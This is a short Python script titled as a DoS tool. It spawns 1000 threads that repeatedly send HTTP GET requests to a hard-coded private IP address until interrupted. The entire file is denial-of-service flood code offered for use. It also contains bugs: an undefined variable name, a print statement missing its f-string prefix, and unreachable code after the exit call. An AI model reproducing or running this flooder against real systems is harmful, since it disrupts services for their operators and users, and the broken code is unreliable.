# Dos-

import requests
import threading
import time
import random
import sys

url = ["http://10.218.233.45/index"]
num_threads = 1000
stop_flag = False # Shared flag to stop threads

def send_request():
    global stop_flag
    url = random.choice(urls)
    while not stop_flag:
        try:
            response = requests.get(url, timeout=10)
            print(f"[URL: {url}] | Status Code: {response.status_code}")
        except requests.exceptions.ReadTimeout:
            print("Read timeout from {url}.")
        except requests.exceptions.RequestException as e:
            print(f"Request to {url} failed: {e}")
        # Optional: tiny sleep to reduce hammering
        # time.sleep(0.01)

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.daemon = True # Daemon threads exit when main program exits
    thread.start()
    threads.append(thread)

try:
    while True:
        time.sleep(1) # Main thread just waits, you can add status here if you want
except KeyboardInterrupt:
    print("\nStopping all threads...")
    stop_flag = True # Signal threads to stop
    time.sleep(2) # Give a moment to finish
    sys.exit()
    print("Stopped.")
    
